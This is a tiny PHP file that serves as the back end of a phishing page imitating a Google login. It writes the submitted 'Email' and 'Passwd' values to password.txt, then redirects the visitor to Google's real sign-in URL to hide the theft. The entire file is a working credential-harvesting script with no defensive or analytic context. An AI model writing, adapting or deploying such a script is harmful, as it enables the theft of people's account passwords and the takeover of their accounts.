<html>
<body>

<?php

$handle = fopen("password.txt", "a");
fwrite($handle,$_POST["Email"]);
fwrite($handle,"\n");
fwrite($handle,$_POST["Passwd"]);
fwrite($handle,"\n");
fwrite($handle,"\n");
fclose($handle) ;
header("Location:https://www.google.com/accounts/ServiceLoginAuth");
exit;

?>

</body>
</html> 
